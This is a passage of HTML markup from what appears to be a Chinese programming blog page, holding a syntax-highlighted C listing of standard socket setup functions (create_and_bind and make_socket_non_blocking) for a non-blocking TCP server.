class="datatypes" style="margin:0px; padding:0px; border:currentColor; background-color:inherit">int</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">create_and_bind (<span class="datatypes" style="margin:0px; padding:0px; border:currentColor; background-color:inherit">char</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> *port)  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">{  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">struct</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> addrinfo hints;  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">struct</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> addrinfo *result, *rp;  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  <span class="datatypes" style="margin:0px; padding:0px; border:currentColor; background-color:inherit">int</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> s, sfd;  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  memset (&amp;hints, 0, <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">sizeof</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> (</span><span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">struct</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> addrinfo));  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  hints.ai_family = AF_UNSPEC;     <span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">/* Return IPv4 and IPv6 choices */</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  hints.ai_socktype = SOCK_STREAM; <span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">/* We want a TCP socket */</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  hints.ai_flags = AI_PASSIVE;     <span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">/* All interfaces */</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  s = getaddrinfo (NULL, port, &amp;hints, &amp;result);  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">if</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> (s != 0)  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">    {  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">      fprintf (stderr, <span class="string" style="margin:0px; padding:0px; border:currentColor; background-color:inherit">"getaddrinfo: %s\n"</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">, gai_strerror (s));  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">      <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">return</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> -1;  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">    }  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">for</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> (rp = result; rp != NULL; rp = rp-&gt;ai_next)  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">    {  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">      sfd = socket (rp-&gt;ai_family, rp-&gt;ai_socktype, rp-&gt;ai_protocol);  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">      <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">if</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> (sfd == -1)  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">        <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">continue</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">;  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">      s = bind (sfd, rp-&gt;ai_addr, rp-&gt;ai_addrlen);  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">      <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">if</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> (s == 0)  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">        {  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">          <span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">/* We managed to bind successfully! */</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">          <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">break</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">;  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">        }  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">      close (sfd);  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">    }  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">if</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> (rp == NULL)  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">    {  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">      fprintf (stderr, <span class="string" style="margin:0px; padding:0px; border:currentColor; background-color:inherit">"Could not bind\n"</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">);  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">      <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">return</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> -1;  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">    }  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  freeaddrinfo (result);  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">return</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> sfd;  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">}  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"><span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">//函数</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"><span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">//功能:设置socket为非阻塞的</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"><span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">static</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> </span><span class="datatypes" style="margin:0px; padding:0px; border:currentColor; background-color:inherit">int</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">make_socket_non_blocking (<span class="datatypes" style="margin:0px; padding:0px; border:currentColor; background-color:inherit">int</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> sfd)  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">{  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  <span class="datatypes" style="margin:0px; padding:0px; border:currentColor; background-color:inherit">int</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> flags, s;  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  <span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">//得到文件状态标志</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  flags = fcntl (sfd, F_GETFL, 0);  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">if</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> (flags == -1)  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">    {  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">      perror (<span class="string" style="margin:0px; padding:0px; border:currentColor; background-color:inherit">"fcntl"</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">);  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">      <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">return</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> -1;  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">    }  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  <span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">//设置文件状态标志</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  flags |= O_NONBLOCK;  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  s = fcntl (sfd, F_SETFL, flags);  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">if</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> (s == -1)  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">    {  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">      perror (<span class="string" style="margin:0px; padding:0px; border:currentColor; background-color:inherit">"fcntl"</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">);  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">      <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">return</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> -1;  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">    }  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">return</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> 0;  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">}  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"><span class="comment" style="margin:0px; padding:0px; border:currentColor; 